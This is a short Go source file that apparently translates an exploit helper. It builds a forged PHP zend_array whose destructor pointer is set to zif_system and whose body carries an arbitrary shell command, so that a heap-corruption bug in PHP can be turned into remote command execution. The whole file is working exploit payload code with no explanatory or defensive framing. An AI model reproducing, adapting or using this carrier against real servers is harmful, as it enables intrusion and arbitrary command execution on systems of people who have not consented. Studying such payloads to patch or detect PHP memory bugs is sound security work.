// Translation of the article-linked pure/mk_ht.py carrier layout.
package carrier
import ("encoding/binary"; "errors")
func BuildCarrier(htdata, zif_system uint64, cmd []byte) ([]byte, error) {
  if len(cmd) > 232 { return nil, errors.New("command length") }
  zend_array := make([]byte, 384)
  pDestructor := zif_system
  execute_data := 0x20
  binary.LittleEndian.PutUint32(zend_array[0:], 1)
  binary.LittleEndian.PutUint32(zend_array[(0) + 4:], 7)
  binary.LittleEndian.PutUint32(zend_array[8:], 16)
  binary.LittleEndian.PutUint32(zend_array[(8) + 4:], 4294967288)
  binary.LittleEndian.PutUint64(zend_array[16:], htdata + 32)
  binary.LittleEndian.PutUint32(zend_array[24:], 1)
  binary.LittleEndian.PutUint32(zend_array[(24) + 4:], 1)
  binary.LittleEndian.PutUint32(zend_array[32:], 8)
  binary.LittleEndian.PutUint32(zend_array[(32) + 4:], 0)
  binary.LittleEndian.PutUint64(zend_array[40:], 0)
  binary.LittleEndian.PutUint64(zend_array[48:], pDestructor)
  binary.LittleEndian.PutUint64(zend_array[execute_data + 0:], 0)
  binary.LittleEndian.PutUint64(zend_array[execute_data + 8:], 0)
  binary.LittleEndian.PutUint64(zend_array[execute_data + 16:], pDestructor)
  binary.LittleEndian.PutUint64(zend_array[execute_data + 24:], 0)
  binary.LittleEndian.PutUint64(zend_array[execute_data + 32:], 0)
  binary.LittleEndian.PutUint32(zend_array[execute_data + 40:], 0)
  binary.LittleEndian.PutUint32(zend_array[execute_data + 44:], 1)
  binary.LittleEndian.PutUint64(zend_array[execute_data + 48:], 0)
  binary.LittleEndian.PutUint64(zend_array[execute_data + 56:], 0)
  binary.LittleEndian.PutUint32(zend_array[execute_data + 64:], 0)
  binary.LittleEndian.PutUint64(zend_array[execute_data + 80:], htdata + 128)
  binary.LittleEndian.PutUint32(zend_array[execute_data + 88:], 6)
  binary.LittleEndian.PutUint32(zend_array[128:], 1)
  binary.LittleEndian.PutUint32(zend_array[(128) + 4:], 262)
  binary.LittleEndian.PutUint64(zend_array[136:], 0)
  binary.LittleEndian.PutUint64(zend_array[144:], uint64(len(cmd)))
  copy(zend_array[0x98:], cmd)
  zend_array[0x98 + len(cmd)] = 0
  return zend_array, nil
}
